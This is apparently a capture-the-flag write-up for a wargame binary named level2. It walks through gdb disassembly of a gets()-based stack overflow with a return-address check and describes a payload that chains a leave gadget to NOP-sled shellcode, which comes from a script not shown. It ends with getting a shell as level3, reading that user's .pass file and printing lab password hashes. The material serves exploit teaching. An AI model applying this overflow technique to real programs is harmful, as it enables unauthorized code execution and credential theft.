## Level 2

level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

Started the program level2 in gdb, and unsat two environment variables to ensure
the same stack offset.
```
$ gdb -q ./level2
(gdb) unset environment LINES
(gdb) unset environment COLUMNS
```
The main function calls an a function `p`
```
(gdb) disas main
   ...
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
```
The function p start by flushing the STDOUT
```
(gdb) disas p
   ...
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   ...
```
After that it uses gets() to get user input
```
   ...
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   ...
```
Than it checks that the return address (ebp+0x4) pushed to the stack by main()
does not start with '0xb', the purpose of this check is to prevent us from injecting
a shellcode and overriting the return address to execute it.
```
   ...
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   ...
```
After passing this check the inputed string is printed using puts()
```
   ...
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   ...
```
And lastly, strdup() is used which will allocate memory and copy the user input into it
```
   ...
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   ...
```
To exploit this program, we had to overrite the EBP and EIP to point to `leave` instruction again, and use the same EBP again so the stack frame don't change after executing `leave`, after that we injected the EIP of our shell code and the shellcode itself.

The would be like this: offset[76 bytes] + EBP + EIP(leave) + EBP + EIP(shellcode) + nop[32 bytes] + shellcode

We created a script to generate this payload for us: shellcode.py.

We executed the program with the payload, and we got a shell as `level3`
```
$ python /tmp/shellcode.py | ./level2
$ whoami
level3
$ cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
